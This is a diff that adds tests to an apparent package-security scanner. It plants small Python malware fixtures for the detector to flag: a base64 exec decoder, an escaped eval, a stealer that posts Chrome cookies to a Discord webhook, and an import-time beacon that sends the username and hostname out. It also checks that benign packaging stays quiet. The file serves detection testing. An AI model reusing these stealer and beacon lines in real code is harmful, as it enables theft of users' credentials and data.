@@ -442,3 +442,28 @@ test("npm release history: provenance dropped, new publisher, install script add
   for (const id of ["npm-provenance-dropped", "npm-trusted-publisher-dropped", "npm-new-publisher", "npm-install-script-added", "npm-size-jump", "npm-fresh-release"]) assert.ok(ids.includes(id), id);
   assert.deepEqual(analyzeHistory(doc, "1.0.2", { now }).map(f => f.rule), []);
 });
+
+test("Python droppers: decoder exec, escaped builtins, stealers, import-time beacons", async () => {
+  const dir = project({
+    "a.py": j("from base64 import b64decode\nexec(b64", "decode('cHJpbnQoMSk='))\n"),
+    "b.py": `_ = eval("\\x65\\x76\\x61\\x6c")\n`,
+    "c.py": j("import browser_cookie3, requests\nrequests.post('https://discord.com/api/web", "hooks/1/x', json={'c': str(browser_cookie3.chrome())})\n"),
+    "pkg/__init__.py": "import urllib.request, getpass, platform\nurllib.request.urlopen('https://x.example/?u=' + getpass.getuser() + platform.node())\n",
+  });
+  const r = await run(dir);
+  for (const id of ["mal-py-exec-decoder", "mal-escaped-builtin", "mal-stealer", "import-time-capabilities"]) assert.ok(rules(r).has(id), id);
+});
+
+test("benign Python packaging stays quiet", async () => {
+  const dir = project({
+    "setup.py": "import subprocess\nexec(open('pkg/version.py').read())\nsubprocess.check_call(['make', 'ext'])\n",
+    "pyproject.toml": "[project]\ndependencies = [\n  \"Twisted>=21.7; platform_python_implementation == 'CPython'\",\n  \"httpx2>=1\",\n]\n",
+    "docs/constraints.txt": "Use a type that fits.\n",
+    "pkg/__init__.py": "import os\nAPI = os.environ.get('API_URL', 'https://api.example')\n",
+    ".pre-commit-config.yaml": "repos:\n  - repo: https://github.com/psf/black\n    rev: 24.1.0\n",
+  });
+  const r = await run(dir);
+  const serious = r.findings.filter(f => ["critical", "high"].includes(f.severity)).map(f => f.rule);
+  assert.deepEqual(serious, []);
+  assert.ok(!rules(r).has("dep-typosquat"));
+});
